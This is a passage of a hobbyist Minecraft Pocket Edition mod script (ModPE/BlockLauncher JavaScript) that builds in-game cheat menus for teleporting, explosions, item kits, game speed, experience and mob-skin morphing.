var gg_exit = new android.widget.Button(ctx);
		gg_exit.setText("Exit");
		gg_exit.setOnClickListener(new android.view.View.OnClickListener() {
			onClick: function(v){
             tmenu.dismiss();
showMenuBtn();
			}
		});
		tmenuLayout.addView(gg_exit);

            tmenu = new android.widget.PopupWindow(tmenuLayout1, ctx.getWindowManager().getDefaultDisplay().getWidth()/2, ctx.getWindowManager().getDefaultDisplay().getHeight());
       /*     tmenu.setBackgroundDrawable(new android.graphics.drawable.ColorDrawable(android.graphics.GUIColor));*/
tmenu.setBackgroundDrawable(new ColorDrawable(GUIColor));
            tmenu.showAtLocation(ctx.getWindow().getDecorView(), android.view.Gravity.CENTER | android.view.Gravity.TOP, 0, 0);
        }catch(error){
            print("A Error Has Happen: " + error);
        }
    }}));
}

function Tsele() {
ctx.runOnUiThread(new java.lang.Runnable(){
run: function(){ 
try{
GetText = new android.widget.PopupWindow();
var Layer = new android.widget.LinearLayout(ctx);
var X = new android.widget.EditText(ctx);
var Y = new android.widget.EditText(ctx);
var Z = new android.widget.EditText(ctx);
var Dialog = new android.app.Dialog(ctx);
var Exit = new android.widget.Button(ctx);

Dialog.setTitle("Type coords to teleport");
Dialog.setContentView(Layer);

Layer.setOrientation(android.widget.LinearLayout.VERTICAL);
Dialog.show();
Layer.addView(X);
Layer.addView(Y);
Layer.addView(Z);
Layer.addView(Exit);

X.setText("");
X.setHint("X");
Y.setText("");
Y.setHint("Y");
Z.setText("");
Z.setHint("Z");
Exit.setText("Teleport");

Exit.setOnClickListener(new android.view.View.OnClickListener(){
onClick: function(view){
px=X.getText();
py=Y.getText();
pz=Z.getText();
Dialog.dismiss();
set();
showMenuBtn();
}
});

GetText.setHeight(android.widget.LinearLayout.LayoutParams.WRAP_CONTENT);
GetText.setWidth(android.widget.LinearLayout.LayoutParams.WRAP_CONTENT);
GetText.showAtLocation(ctx.getWindow().getDecorView(), android.view.Gravity.TOP, 0, 0);
} catch (e){
print("The Teleport Dialog Is Malfunctioning:"+e);
}
}});
}

function set() {
setPosition(Player.getEntity(), px, py, pz);
net.zhuoweizhang.mcpelauncher.ScriptManager.nativeSendChat("/tp " + Player.getName(Player.getEntity()) + space + px + space + py + space + pz);
}

function nmenu_menu(){
ctx.runOnUiThread(new Runnable({ run: function(){
        try{
            var nmenuLayout = new LinearLayout(ctx);
            var nmenuScroll = new ScrollView(ctx);
            var nmenuLayout1 = new LinearLayout(ctx);
            nmenuLayout.setOrientation(1);
            nmenuLayout1.setOrientation(1);
            nmenuScroll.addView(nmenuLayout);
            nmenuLayout1.addView(nmenuScroll);

var MainTitle = new android.widget.TextView(ctx); MainTitle.setGravity(android.view.Gravity.CENTER);
		MainTitle.setText(name + space + version);
       MainTitle.setTextColor(GUIName);
		MainTitle.setTextSize(20);
		nmenuLayout.addView(MainTitle);
            
            var l_title = new android.widget.TextView(ctx); l_title.setGravity(android.view.Gravity.CENTER);
		l_title.setText("Nuke Menu");
       l_title.setTextColor(GUIName);
		l_title.setTextSize(20);
		nmenuLayout.addView(l_title);

var g_exit = new android.widget.Button(ctx);
		g_exit.setText("Exit");
		g_exit.setOnClickListener(new android.view.View.OnClickListener() {
			onClick: function(v){
             nmenu.dismiss();
showMenuBtn();
			}
		});
		nmenuLayout.addView(g_exit);

var n1 = new Button(ctx);
            n1.setText("Nuke 1%");  
            n1.setOnClickListener(new View.OnClickListener({
                onClick: function(viewarg){         explode(getPlayerX(),getPlayerY(),getPlayerZ(),1);
                }
            }));
            nmenuLayout.addView(n1);

     var n2 = new Button(ctx);
            n2.setText("Nuke 5%");
            n2.setOnClickListener(new View.OnClickListener({
                onClick: function(viewarg){         explode(getPlayerX(),getPlayerY(),getPlayerZ(),5);
                }
            }));
            nmenuLayout.addView(n2);

var n3 = new Button(ctx);
            n3.setText("Nuke 10%");
            n3.setOnClickListener(new View.OnClickListener({
                onClick: function(viewarg){         explode(getPlayerX(),getPlayerY(),getPlayerZ(),10);
                }
            }));
            nmenuLayout.addView(n3);

var n4 = new Button(ctx);
            n4.setText("Nuke 15%");
            n4.setOnClickListener(new View.OnClickListener({
                onClick: function(viewarg){         explode(getPlayerX(),getPlayerY(),getPlayerZ(),15);
                }
            }));
            nmenuLayout.addView(n4);

var n5 = new Button(ctx);
            n5.setText("Nuke 20%");
            n5.setOnClickListener(new View.OnClickListener({
                onClick: function(viewarg){         explode(getPlayerX(),getPlayerY(),getPlayerZ(),20);
                }
            }));
            nmenuLayout.addView(n5);

var n6 = new Button(ctx);
            n6.setText("Nuke 25%");
            n6.setOnClickListener(new View.OnClickListener({
                onClick: function(viewarg){         explode(getPlayerX(),getPlayerY(),getPlayerZ(),25);
                }
            }));
            nmenuLayout.addView(n6);

var n7 = new Button(ctx);
            n7.setText("Nuke 30%");
            n7.setOnClickListener(new View.OnClickListener({
                onClick: function(viewarg){         explode(getPlayerX(),getPlayerY(),getPlayerZ(),30);
                }
            }));
            nmenuLayout.addView(n7);

var n8 = new Button(ctx);
            n8.setText("Nuke 35%");
            n8.setOnClickListener(new View.OnClickListener({
                onClick: function(viewarg){         explode(getPlayerX(),getPlayerY(),getPlayerZ(),35);
                }
            }));
            nmenuLayout.addView(n8);

var n9 = new Button(ctx);
            n9.setText("Nuke 40%");
            n9.setOnClickListener(new View.OnClickListener({
                onClick: function(viewarg){         explode(getPlayerX(),getPlayerY(),getPlayerZ(),40);
                }
            }));
            nmenuLayout.addView(n9);

var n10 = new Button(ctx);
            n10.setText("Nuke 45%");
            n10.setOnClickListener(new View.OnClickListener({
                onClick: function(viewarg){         explode(getPlayerX(),getPlayerY(),getPlayerZ(),45);
                }
            }));
            nmenuLayout.addView(n10);

var n11 = new Button(ctx);
            n11.setText("Nuke 50%");
            n11.setOnClickListener(new View.OnClickListener({
                onClick: function(viewarg){         explode(getPlayerX(),getPlayerY(),getPlayerZ(),50);
                }
            }));
            nmenuLayout.addView(n11);
		
		var h_exit = new android.widget.Button(ctx);
		h_exit.setText("Exit");
		h_exit.setOnClickListener(new android.view.View.OnClickListener() {
			onClick: function(v){
             nmenu.dismiss();
showMenuBtn();
			}
		});
		nmenuLayout.addView(h_exit);

            nmenu = new PopupWindow(nmenuLayout1, ctx.getWindowManager().getDefaultDisplay().getWidth()/3, ctx.getWindowManager().getDefaultDisplay().getHeight());
            nmenu.setBackgroundDrawable(new ColorDrawable(GUIColor));
            nmenu.showAtLocation(ctx.getWindow().getDecorView(), Gravity.CENTER | Gravity.TOP, 0, 0);
            }catch(error){
                Toast.makeText(ctx, "An error occured: " + error, 1).show();
            }
    }}));
}

function GiveMenu() {
ctx.runOnUiThread(new java.lang.Runnable({ run: function(){
        try{
            var gmenuLayout = new android.widget.LinearLayout(ctx);
            var gmenuScroll = new android.widget.ScrollView(ctx);
            var gmenuLayout1 = new android.widget.LinearLayout(ctx);
            gmenuLayout.setOrientation(1);
            gmenuLayout1.setOrientation(1);

            gmenuScroll.addView(gmenuLayout);
            gmenuLayout1.addView(gmenuScroll);


var MainTitle = new android.widget.TextView(ctx); MainTitle.setGravity(android.view.Gravity.CENTER);
		MainTitle.setText(name + space + version);
       MainTitle.setTextColor(GUIName);
		MainTitle.setTextSize(20);
		gmenuLayout.addView(MainTitle);

var gtitle = new android.widget.TextView(ctx); gtitle.setGravity(android.view.Gravity.CENTER);
		gtitle.setText("Give Menu");
       gtitle.setTextColor(GUIName);
		gtitle.setTextSize(20);
		gmenuLayout.addView(gtitle);

            var button = new android.widget.Button(ctx);
            button.setText("Custom Give");
            button.setOnClickListener(new android.view.View.OnClickListener({
                onClick: function(viewarg){
MGive();
gmenu.dismiss();
                }
            }));
            gmenuLayout.addView(button);

var button90 = new android.widget.Button(ctx);
            button90.setText("Item ID list");
            button90.setOnClickListener(new android.view.View.OnClickListener({
                onClick: function(viewarg){
idList(); 
                }
            }));
            gmenuLayout.addView(button90);

function idList()
      {
      ctx.runOnUiThread(new java.lang.Runnable({run: function(){
      var webs = new android.webkit.WebView(ctx);
      var webset = webs.getSettings();
      webset.setJavaScriptEnabled(true);
      webs.setWebChromeClient(new android.webkit.WebChromeClient());
      webs.setWebViewClient(new android.webkit.WebViewClient());
      webs.loadUrl('http://www.minecraftinfo.com/idlist.html');
/*Site URL*/
      new android.app.AlertDialog.Builder(ctx).setView(webs).show();
      }}));
      }

var butto = new android.widget.Button(ctx);
            butto.setText("hidden items C inventory");
            butto.setOnClickListener(new android.view.View.OnClickListener({
                onClick: function(viewarg){
 Player.addItemCreativeInv(90, 5, 0);
Player.addItemCreativeInv(95, 5, 0);
Player.addItemCreativeInv(208, 5, 0);
Player.addItemCreativeInv(255, 5, 0);
Player.addItemCreativeInv(398, 5, 0);
Player.addItemCreativeInv(439, 5, 2);
Player.addItemCreativeInv(246, 5, 0);
Player.addItemCreativeInv(247, 5, 0);
Player.addItemCreativeInv(247, 5, 1);
Player.addItemCreativeInv(247, 5, 2);
Player.addItemCreativeInv(248, 5, 0);
clientMessage("§7Hidden items have been added to your creative inventory!");
                }
            }));
            gmenuLayout.addView(butto);

var k1 = new android.widget.Button(ctx);
            k1.setText("Leather kit");
            k1.setOnClickListener(new android.view.View.OnClickListener({
                onClick: function(viewarg){
Player.setArmorSlot(0, 298, 0);
Player.setArmorSlot(1, 299, 0);
Player.setArmorSlot(2, 300, 0);
Player.setArmorSlot(3, 301, 0);
clientMessage("§6Leather §fkit equipped check inventory!");
addItemInventory(268, 1, 0);
addItemInventory(269, 1, 0);
addItemInventory(270, 1, 0);
addItemInventory(271, 1, 0);
addItemInventory(290, 1, 0);
                }
            }));
            gmenuLayout.addView(k1);

var k2 = new android.widget.Button(ctx);
            k2.setText("Chain kit");
            k2.setOnClickListener(new android.view.View.OnClickListener({
                onClick: function(viewarg){
Player.setArmorSlot(0, 302, 0);
Player.setArmorSlot(1, 303, 0);
Player.setArmorSlot(2, 304, 0);
Player.setArmorSlot(3, 305, 0);
clientMessage("§7Chain §fkit equipped check inventory!");
addItemInventory(272, 1, 0);
addItemInventory(273, 1, 0);
addItemInventory(274, 1, 0);
addItemInventory(275, 1, 0);
addItemInventory(291, 1, 0);
                }
            }));
            gmenuLayout.addView(k2);

var k3 = new android.widget.Button(ctx);
            k3.setText("Iron kit");
            k3.setOnClickListener(new android.view.View.OnClickListener({
                onClick: function(viewarg){
Player.setArmorSlot(0, 306, 0);
Player.setArmorSlot(1, 307, 0);
Player.setArmorSlot(2, 308, 0);
Player.setArmorSlot(3, 309, 0);
clientMessage("§fIron §fkit equipped check inventory!");
addItemInventory(267, 1, 0);
addItemInventory(256, 1, 0);
addItemInventory(257, 1, 0);
addItemInventory(258, 1, 0);
addItemInventory(292, 1, 0);
                }
            }));
            gmenuLayout.addView(k3);

var k4 = new android.widget.Button(ctx);
            k4.setText("Gold kit");
            k4.setOnClickListener(new android.view.View.OnClickListener({
                onClick: function(viewarg){
Player.setArmorSlot(0, 314, 0);
Player.setArmorSlot(1, 315, 0);
Player.setArmorSlot(2, 316, 0);
Player.setArmorSlot(3, 317, 0);
clientMessage("§eGold §fkit equipped check inventory!");
addItemInventory(283, 1, 0);
addItemInventory(284, 1, 0);
addItemInventory(285, 1, 0);
addItemInventory(286, 1, 0);
addItemInventory(294, 1, 0);
                }
            }));
            gmenuLayout.addView(k4);

var k5 = new android.widget.Button(ctx);
            k5.setText("Diamond kit");
            k5.setOnClickListener(new android.view.View.OnClickListener({
                onClick: function(viewarg){
Player.setArmorSlot(0, 310, 0);
Player.setArmorSlot(1, 311, 0);
Player.setArmorSlot(2, 312, 0);
Player.setArmorSlot(3, 313, 0);
clientMessage("§bDiamond §fkit equipped check inventory!");
addItemInventory(276, 1, 0);
addItemInventory(277, 1, 0);
addItemInventory(278, 1, 0);
addItemInventory(279, 1, 0);
addItemInventory(293, 1, 0);
                }
            }));
            gmenuLayout.addView(k5);

var gg_exit = new android.widget.Button(ctx);
		gg_exit.setText("Exit");
		gg_exit.setOnClickListener(new android.view.View.OnClickListener() {
			onClick: function(v){
             gmenu.dismiss();
showMenuBtn();
print("Loading web page");
			}
		});
		gmenuLayout.addView(gg_exit);

            gmenu = new android.widget.PopupWindow(gmenuLayout1, ctx.getWindowManager().getDefaultDisplay().getWidth()/2, ctx.getWindowManager().getDefaultDisplay().getHeight());
          /*  gmenu.setBackgroundDrawable(new android.graphics.drawable.ColorDrawable(android.graphics.GUIColor));*/
gmenu.setBackgroundDrawable(new ColorDrawable(GUIColor));
            gmenu.showAtLocation(ctx.getWindow().getDecorView(), android.view.Gravity.CENTER | android.view.Gravity.TOP, 0, 0);
        }catch(error){
            print("A Error Has Happen: " + error);
        }
    }}));
}

function MGive() {
ctx.runOnUiThread(new java.lang.Runnable(){
run: function(){ 
try{
GetText = new android.widget.PopupWindow();
var Layer = new android.widget.LinearLayout(ctx);
var ID = new android.widget.EditText(ctx);
var Amount = new android.widget.EditText(ctx);
var Damage = new android.widget.EditText(ctx);
var Dialog = new android.app.Dialog(ctx);
var Exit = new android.widget.Button(ctx);

Dialog.setTitle("Enter ID,Amt,Dmg");
Dialog.setContentView(Layer);

Layer.setOrientation(android.widget.LinearLayout.VERTICAL);
Dialog.show();
Layer.addView(ID);
Layer.addView(Amount);
Layer.addView(Damage);
Layer.addView(Exit);

ID.setText("");
ID.setHint("Item ID");
Amount.setText("");
Amount.setHint("Item Amount");
Damage.setText("");
Damage.setHint("Item Damage");
Exit.setText("GET items");

Exit.setOnClickListener(new android.view.View.OnClickListener(){
onClick: function(view){
I=ID.getText();
A=Amount.getText();
D=Damage.getText();
Dialog.dismiss();
GG();
showMenuBtn();
}
});

GetText.setHeight(android.widget.LinearLayout.LayoutParams.WRAP_CONTENT);
GetText.setWidth(android.widget.LinearLayout.LayoutParams.WRAP_CONTENT);
GetText.showAtLocation(ctx.getWindow().getDecorView(), android.view.Gravity.TOP, 0, 0);
} catch (e){
print("The Give Dialog Is Malfunctioning:"+e);
}
}});
}

function GG() {
Player.addItemInventory(I,A,D);
net.zhuoweizhang.mcpelauncher.ScriptManager.nativeSendChat("/give " + Player.getName(Player.getEntity()) + space + I + ":" + D + space + A);
}

function dmenu_menu(){
ctx.runOnUiThread(new Runnable({ run: function(){
        try{
            var dmenuLayout = new LinearLayout(ctx);
            var dmenuScroll = new ScrollView(ctx);
            var dmenuLayout1 = new LinearLayout(ctx);
            dmenuLayout.setOrientation(1);
            dmenuLayout1.setOrientation(1);
            dmenuScroll.addView(dmenuLayout);
            dmenuLayout1.addView(dmenuScroll);

var MainTitle = new android.widget.TextView(ctx); MainTitle.setGravity(android.view.Gravity.CENTER);
		MainTitle.setText(name + space + version);
       MainTitle.setTextColor(GUIName);
		MainTitle.setTextSize(20);
		dmenuLayout.addView(MainTitle);
            
            var title = new android.widget.TextView(ctx); title.setGravity(android.view.Gravity.CENTER);
		title.setText("Speed Menu");
       title.setTextColor(GUIName);
		title.setTextSize(20);
		dmenuLayout.addView(title);

var exit = new android.widget.Button(ctx);
		exit.setText("Exit");
		exit.setOnClickListener(new android.view.View.OnClickListener() {
			onClick: function(v){
             dmenu.dismiss();
showMenuBtn();
			}
		});
		dmenuLayout.addView(exit);

var d1 = new Button(ctx);
            d1.setText("Normal speed");       
            d1.setOnClickListener(new View.OnClickListener({
                onClick: function(viewarg){         
                	ModPE.setGameSpeed(20);
                }
            }));
            dmenuLayout.addView(d1);
            
            var d2 = new Button(ctx);
            d2.setText("Speed 5%");       
            d2.setOnClickListener(new View.OnClickListener({
                onClick: function(viewarg){         
                	ModPE.setGameSpeed(25);
                }
            }));
            dmenuLayout.addView(d2);
            
            var d3 = new Button(ctx);
            d3.setText("Speed 10%");       
            d3.setOnClickListener(new View.OnClickListener({
                onClick: function(viewarg){         
                	ModPE.setGameSpeed(30);
                }
            }));
            dmenuLayout.addView(d3);
            
            var d4 = new Button(ctx);
            d4.setText("Speed 15%");       
            d4.setOnClickListener(new View.OnClickListener({
                onClick: function(viewarg){         
                	ModPE.setGameSpeed(35);
                }
            }));
            dmenuLayout.addView(d4);
            
            var d5 = new Button(ctx);
            d5.setText("Speed 20%");       
            d5.setOnClickListener(new View.OnClickListener({
                onClick: function(viewarg){         
                	ModPE.setGameSpeed(40);
                }
            }));
            dmenuLayout.addView(d5);
            
            var d6 = new Button(ctx);
            d6.setText("Speed 25%");       
            d6.setOnClickListener(new View.OnClickListener({
                onClick: function(viewarg){         
                	ModPE.setGameSpeed(45);
                }
            }));
            dmenuLayout.addView(d6);
            
            var d7 = new Button(ctx);
            d7.setText("Speed 30%");       
            d7.setOnClickListener(new View.OnClickListener({
                onClick: function(viewarg){         
                	ModPE.setGameSpeed(50);
                }
            }));
            dmenuLayout.addView(d7);
            
            var d8 = new Button(ctx);
            d8.setText("Speed 35%");       
            d8.setOnClickListener(new View.OnClickListener({
                onClick: function(viewarg){         
                	ModPE.setGameSpeed(55);
                }
            }));
            dmenuLayout.addView(d8);
            
            var d9 = new Button(ctx);
            d9.setText("Speed 40%");       
            d9.setOnClickListener(new View.OnClickListener({
                onClick: function(viewarg){         
                	ModPE.setGameSpeed(60);
                }
            }));
            dmenuLayout.addView(d9);

var d10 = new Button(ctx);
            d10.setText("Speed 45%");       
            d10.setOnClickListener(new View.OnClickListener({
                onClick: function(viewarg){         
                	ModPE.setGameSpeed(65);
                }
            }));
            dmenuLayout.addView(d10);

var d11 = new Button(ctx);
            d11.setText("Speed 50%");       
            d11.setOnClickListener(new View.OnClickListener({
                onClick: function(viewarg){         
                	ModPE.setGameSpeed(70);
                }
            }));
            dmenuLayout.addView(d11);
		
		var exit2 = new android.widget.Button(ctx);
		exit2.setText("Exit");
		exit2.setOnClickListener(new android.view.View.OnClickListener() {
			onClick: function(v){
             dmenu.dismiss();
showMenuBtn();
			}
		});
		dmenuLayout.addView(exit2);

            dmenu = new PopupWindow(dmenuLayout1, ctx.getWindowManager().getDefaultDisplay().getWidth()/3, ctx.getWindowManager().getDefaultDisplay().getHeight());
            dmenu.setBackgroundDrawable(new ColorDrawable(GUIColor));
            dmenu.showAtLocation(ctx.getWindow().getDecorView(), Gravity.CENTER | Gravity.TOP, 0, 0);
            }catch(error){
                Toast.makeText(ctx, "An error occured: " + error, 1).show();
            }
    }}));
}

function ExMenu() {
ctx.runOnUiThread(new java.lang.Runnable({ run: function(){
        try{
            var xmenuLayout = new android.widget.LinearLayout(ctx);
            var xmenuScroll = new android.widget.ScrollView(ctx);
            var xmenuLayout1 = new android.widget.LinearLayout(ctx);
            xmenuLayout.setOrientation(1);
            xmenuLayout1.setOrientation(1);

            xmenuScroll.addView(xmenuLayout);
            xmenuLayout1.addView(xmenuScroll);

var MainTitle = new android.widget.TextView(ctx); MainTitle.setGravity(android.view.Gravity.CENTER);
		MainTitle.setText(name + space + version);
       MainTitle.setTextColor(GUIName);
		MainTitle.setTextSize(20);
		xmenuLayout.addView(MainTitle);

var xtitle = new android.widget.TextView(ctx); xtitle.setGravity(android.view.Gravity.CENTER);
		xtitle.setText("Experience Menu");
       xtitle.setTextColor(GUIName);
		xtitle.setTextSize(20);
		xmenuLayout.addView(xtitle);

            var button = new android.widget.Button(ctx);
            button.setText("Add experience");
            button.setOnClickListener(new android.view.View.OnClickListener({
                onClick: function(viewarg){
XGive();
xmenu.dismiss();
                }
            }));
            xmenuLayout.addView(button);

var rr_exit = new android.widget.Button(ctx);
		rr_exit.setText("Exit");
	   rr_exit.setOnClickListener(new android.view.View.OnClickListener() {
			onClick: function(v){
             xmenu.dismiss();
showMenuBtn();
			}
		});
		xmenuLayout.addView(rr_exit);

            xmenu = new android.widget.PopupWindow(xmenuLayout1, ctx.getWindowManager().getDefaultDisplay().getWidth()/2, ctx.getWindowManager().getDefaultDisplay().getHeight());
        /*    xmenu.setBackgroundDrawable(new android.graphics.drawable.ColorDrawable(android.graphics.GUIColor));*/
xmenu.setBackgroundDrawable(new ColorDrawable(GUIColor));
            xmenu.showAtLocation(ctx.getWindow().getDecorView(), android.view.Gravity.CENTER | android.view.Gravity.TOP, 0, 0);
        }catch(error){
            print("A Error Has Happen: " + error);
        }
    }}));
}

function XGive() {
ctx.runOnUiThread(new java.lang.Runnable(){
run: function(){ 
try{
GetText = new android.widget.PopupWindow();
var Layer = new android.widget.LinearLayout(ctx);
var XP = new android.widget.EditText(ctx);
var Dialog = new android.app.Dialog(ctx);
var Exit = new android.widget.Button(ctx);

Dialog.setTitle("Enter XP Amount");
Dialog.setContentView(Layer);

Layer.setOrientation(android.widget.LinearLayout.VERTICAL);
Dialog.show();
Layer.addView(XP);
Layer.addView(Exit);

XP.setText("");
XP.setHint("EXP");
Exit.setText("GET exp");

Exit.setOnClickListener(new android.view.View.OnClickListener(){
onClick: function(view){
L=XP.getText();
Dialog.dismiss();
XG();
showMenuBtn();
}
});

GetText.setHeight(android.widget.LinearLayout.LayoutParams.WRAP_CONTENT);
GetText.setWidth(android.widget.LinearLayout.LayoutParams.WRAP_CONTENT);
GetText.showAtLocation(ctx.getWindow().getDecorView(), android.view.Gravity.TOP, 0, 0);
} catch (e){
print("The XP Dialog Is Malfunctioning:"+e);
}
}});
}

function XG() {
Player.setExp(Math.round(L));
Player.addExp(Math.round(L));
}

function mMenu(){
ctx.runOnUiThread(new Runnable({ run: function(){
        try{
            var mmenuLayout = new LinearLayout(ctx);
            var mmenuScroll = new ScrollView(ctx);
            var mmenuLayout1 = new LinearLayout(ctx);
            mmenuLayout.setOrientation(1);
            mmenuLayout1.setOrientation(1);
            mmenuScroll.addView(mmenuLayout);
            mmenuLayout1.addView(mmenuScroll);

var MainTitle = new android.widget.TextView(ctx); MainTitle.setGravity(android.view.Gravity.CENTER);
		MainTitle.setText(name + space + version);
       MainTitle.setTextColor(GUIName);
		MainTitle.setTextSize(20);
		mmenuLayout.addView(MainTitle);
            
            var T_title = new android.widget.TextView(ctx); T_title.setGravity(android.view.Gravity.CENTER);
		T_title.setText("Morph Menu");
       T_title.setTextColor(GUIName);
		T_title.setTextSize(20);
		mmenuLayout.addView(T_title);

var A_exit = new android.widget.Button(ctx);
		A_exit.setText("Exit");
		A_exit.setOnClickListener(new android.view.View.OnClickListener() {
			onClick: function(v){
             mmenu.dismiss();
			}
		});
		mmenuLayout.addView(A_exit);

var mm1 = new android.widget.Button(ctx);
            mm1.setText("Player");
            mm1.setOnClickListener(new android.view.View.OnClickListener({
                onClick: function(viewarg){
Entity.setMobSkin(Player.getEntity(), "mob/player.png");
Entity.setRenderType(Player.getEntity(), Entity.setRenderType.player);
                }
            }));
            mmenuLayout.addView(mm1);

var mm0 = new android.widget.Button(ctx);
            mm0.setText("Blaze");
            mm0.setOnClickListener(new android.view.View.OnClickListener({
                onClick: function(viewarg){
Entity.setMobSkin(Player.getEntity(), "mob/blaze.png"); 
Entity.setRenderType(Player.getEntity(), Entity.setRenderType.blaze);
                }
            }));
            mmenuLayout.addView(mm0);

var mm2 = new android.widget.Button(ctx);
            mm2.setText("Chicken");
            mm2.setOnClickListener(new android.view.View.OnClickListener({
                onClick: function(viewarg){
Entity.setMobSkin(Player.getEntity(), "mob/chicken.png"); 
Entity.setRenderType(Player.getEntity(), EntityRenderType.chicken);
                }
            }));
            mmenuLayout.addView(mm2);

var mm3 = new android.widget.Button(ctx);
            mm3.setText("Cow");
            mm3.setOnClickListener(new android.view.View.OnClickListener({
                onClick: function(viewarg){
Entity.setMobSkin(Player.getEntity(), "mob/cow.png");
Entity.setRenderType(Player.getEntity(), EntityRenderType.cow);
                }
            }));
            mmenuLayout.addView(mm3);

var mm4 = new android.widget.Button(ctx);
            mm4.setText("Creeper");
            mm4.setOnClickListener(new android.view.View.OnClickListener({
                onClick: function(viewarg){
Entity.setMobSkin(Player.getEntity(), "mob/creeper.png");
Entity.setRenderType(Player.getEntity(), EntityRenderType.creeper);
                }
            }));
            mmenuLayout.addView(mm4);

var mm5 = new android.widget.Button(ctx);
            mm5.setText("Enderman");
            mm5.setOnClickListener(new android.view.View.OnClickListener({
                onClick: function(viewarg){
Entity.setMobSkin(Player.getEntity(), "mob/enderman.png");
Entity.setRenderType(Player.getEntity(), EntityRenderType.enderman);
                }
            }));
            mmenuLayout.addView(mm5);

var mm6 = new android.widget.Button(ctx);
            mm6.setText("Ghast");
            mm6.setOnClickListener(new android.view.View.OnClickListener({
                onClick: function(viewarg){
Entity.setMobSkin(Player.getEntity(), "mob/ghast.png");
Entity.setRenderType(Player.getEntity(), EntityRenderType.ghast);
                }
            }));
            mmenuLayout.addView(mm6);

var mm7 = new android.widget.Button(ctx);
            mm7.setText("Iron golem");
            mm7.setOnClickListener(new android.view.View.OnClickListener({
                onClick: function(viewarg){
Entity.setMobSkin(Player.getEntity(), "mob/ironGolem.png");
Entity.setRenderType(Player.getEntity(), EntityRenderType.ironGolem);
                }
            }));
            mmenuLayout.addView(mm7);

var mm8 = new android.widget.Button(ctx);
            mm8.setText("Lava slime");
            mm8.setOnClickListener(new android.view.View.OnClickListener({
                onClick: function(viewarg){
Entity.setMobSkin(Player.getEntity(), "mob/lavaSlime.png");
Entity.setRenderType(Player.getEntity(), EntityRenderType.lavaSlime);
                }
            }));
            mmenuLayout.addView(mm8);

var mm9 = new android.widget.Button(ctx);
            mm9.setText("Ocelot");
            mm9.setOnClickListener(new android.view.View.OnClickListener({
                onClick: function(viewarg){
Entity.setMobSkin(Player.getEntity(), "mob/ocelot.png");
Entity.setRenderType(Player.getEntity(), EntityRenderType.ocelot);
                }
            }));
            mmenuLayout.addView(mm9);

var mm10 = new android.widget.Button(ctx);
            mm10.setText("Pig");
            mm10.setOnClickListener(new android.view.View.OnClickListener({
                onClick: function(viewarg){
Entity.setMobSkin(Player.getEntity(), "mob/pig.png");
Entity.setRenderType(Player.getEntity(), EntityRenderType.pig);
                }
            }));
            mmenuLayout.addView(mm10);

var mm11 = new android.widget.Button(ctx);
            mm11.setText("Sheep");
            mm11.setOnClickListener(new android.view.View.OnClickListener({
                onClick: function(viewarg){
Entity.setMobSkin(Player.getEntity(), "mob/sheep.png");
Entity.setRenderType(Player.getEntity(), EntityRenderType.sheep);
                }
            }));
            mmenuLayout.addView(mm11);

var mm12 = new android.widget.Button(ctx);
            mm12.setText("Silverfish");
            mm12.setOnClickListener(new android.view.View.OnClickListener({
                onClick: function(viewarg){
Entity.setMobSkin(Player.getEntity(), "mob/silverfish.png");
Entity.setRenderType(Player.getEntity(), EntityRenderType.silverfish);
                }
            }));
            mmenuLayout.addView(mm12);

var mm13 = new android.widget.Button(ctx);
            mm13.setText("Skeleton");
            mm13.setOnClickListener(new android.view.View.OnClickListener({
                onClick: function(viewarg){
Entity.setMobSkin(Player.getEntity(), "mob/skeleton.png");
Entity.setRenderType(Player.getEntity(), EntityRenderType.skeleton);
                }
            }));
            mmenuLayout.addView(mm13);

var mm14 = new android.widget.Button(ctx);
            mm14.setText("Slime");
            mm14.setOnClickListener(new android.view.View.OnClickListener({
                onClick: function(viewarg){
Entity.setMobSkin(Player.getEntity(), "mob/slime.png");
Entity.setRenderType(Player.getEntity(), EntityRenderType.slime);
                }
            }));
            mmenuLayout.addView(mm14);

var mm15 = new android.widget.Button(ctx);
            mm15.setText("Snow golem");
            mm15.setOnClickListener(new android.view.View.OnClickListener({
                onClick: function(viewarg){
Entity.setMobSkin(Player.getEntity(), "mob/snowGolem.png");
Entity.setRenderType(Player.getEntity(), EntityRenderType.snowGolem);
                }
            }));
            mmenuLayout.addView(mm15);

var mm16 = new android.widget.Button(ctx);
            mm16.setText("Spider");
            mm16.setOnClickListener(new android.view.View.OnClickListener({
                onClick: function(viewarg){
Entity.setMobSkin(Player.getEntity(), "mob/spider.png");
Entity.setRenderType(Player.getEntity(), EntityRenderType.spider);
                }
            }));
            mmenuLayout.addView(mm16);

var mm17 = new android.widget.Button(ctx);
            mm17.setText("Squid");
            mm17.setOnClickListener(new android.view.View.OnClickListener({
                onClick: function(viewarg){
Entity.setMobSkin(Player.getEntity(), "mob/squid.png");
Entity.setRenderType(Player.getEntity(), EntityRenderType.squid);
                }
            }));
            mmenuLayout.addView(mm17);

var mm18 = new android.widget.Button(ctx);
            mm18.setText("Villager");
            mm18.setOnClickListener(new android.view.View.OnClickListener({
                onClick: function(viewarg){
Entity.setMobSkin(Player.getEntity(), "mob/villager.png");
Entity.setRenderType(Player.getEntity(), EntityRenderType.villager);
                }
            }));
            mmenuLayout.addView(mm18);

var mm19 = new android.widget.Button(ctx);
            mm19.setText("Villager zombie");
            mm19.setOnClickListener(new android.view.View.OnClickListener({
                onClick: function(viewarg){
Entity.setMobSkin(Player.getEntity(), "mob/villagerZombie.png");
Entity.setRenderType(Player.getEntity(), EntityRenderType.villagerZombie);
                }
            }));
            mmenuLayout.addView(mm19);

var mm20 = new android.widget.Button(ctx);
            mm20.setText("Wolf");
            mm20.setOnClickListener(new android.view.View.OnClickListener({
                onClick: function(viewarg){
Entity.setMobSkin(Player.getEntity(), "mob/wolf.png");
Entity.setRenderType(Player.getEntity(), EntityRenderType.wolf);
                }
            }));
            mmenuLayout.addView(mm20);

var mm21 = new android.widget.Button(ctx);
            mm21.setText("Zombie");
            mm21.setOnClickListener(new android.view.View.OnClickListener({
                onClick: function(viewarg){
Entity.setMobSkin(Player.getEntity(), "mob/zombie.png");
Entity.setRenderType(Player.getEntity(), EntityRenderType.zombie);
                }
            }));
            mmenuLayout.addView(mm21);

var mm22 = new android.widget.Button(ctx);
            mm22.setText("Zombie pigman");
            mm22.setOnClickListener(new android.view.View.OnClickListener({
                onClick: function(viewarg){
Entity.setMobSkin(Player.getEntity(), "mob/zombiePigman.png");
Entity.setRenderType(Player.getEntity(), EntityRenderType.zombiePigman);
                }
            }));
            mmenuLayout.addView(mm22);

		var B_exit = new android.widget.Button(ctx);
		B_exit.setText("Exit");
		B_exit.setOnClickListener(new android.view.View.OnClickListener() {
			onClick: function(v){
